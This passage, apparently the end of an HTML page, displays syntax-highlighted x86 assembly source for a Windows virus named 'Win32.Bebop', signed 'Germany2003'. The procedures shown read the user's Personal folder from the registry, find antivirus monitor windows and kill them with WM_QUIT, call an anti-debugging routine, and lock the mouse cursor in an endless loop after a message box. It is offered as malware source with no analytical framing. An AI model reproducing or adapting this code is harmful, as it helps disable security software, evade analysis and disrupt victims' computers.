</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Read Personal Directory from Registry Procedure---------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GetPersonalDir</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">;procedure</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegHandle</span><span class="sc0">           </span><span class="sc1">;save there the handle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0000h</span><span class="sc0">              </span><span class="sc1">;read and write</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ShellFolders</span><span class="sc0">        </span><span class="sc1">;subkey</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000003h</span><span class="sc0">              </span><span class="sc1">;HKEY_...</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegOpenKeyExA</span><span class="sc0">          </span><span class="sc1">;open the subkey</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;error?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">RegError</span><span class="sc0">                </span><span class="sc1">;set error code and return</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">Size</span><span class="sc0">                </span><span class="sc1">;260d</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PersonalFolder</span><span class="sc0">      </span><span class="sc1">;save the value there</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lpType</span><span class="sc0">          </span><span class="sc1">;fuck off</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Personal</span><span class="sc0">            </span><span class="sc1">;value name</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;handle from subkey</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegQueryValueExA</span><span class="sc0">           </span><span class="sc1">;read!</span><span class="sc0">

</span><span class="sc5">RegError</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;error!</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHandle</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;close reg</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Anti AV-Monitor Procedure-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">KillMonitor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;offset to monitor name</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindWindowA</span><span class="sc0">            </span><span class="sc1">;find it</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;error?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FuckNextMonitor</span><span class="sc0">          </span><span class="sc1">;return</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                </span><span class="sc1">;WM_QUIT = kill</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;handle of window</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PostMessageA</span><span class="sc0">           </span><span class="sc1">;shot 'em up</span><span class="sc0">

</span><span class="sc5">FuckNextMonitor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Stop the Cursor Procedure-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">StopCursor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oTitle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oMsg</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AntiDebugger</span><span class="sc0">

</span><span class="sc5">SleepStop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2000d</span><span class="sc0">              </span><span class="sc1">;sleep 2sek</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">StopIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4000d</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SleepStop</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">y</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;y coor</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;x coor</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCursorPos</span><span class="sc0">           </span><span class="sc1">;stop it</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StopIt</span><span class="sc0">              </span><span class="sc1">;stop again</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----Win32.Bebop ends----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Bebop</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------Germany2003--------</span></div></body>
</html>
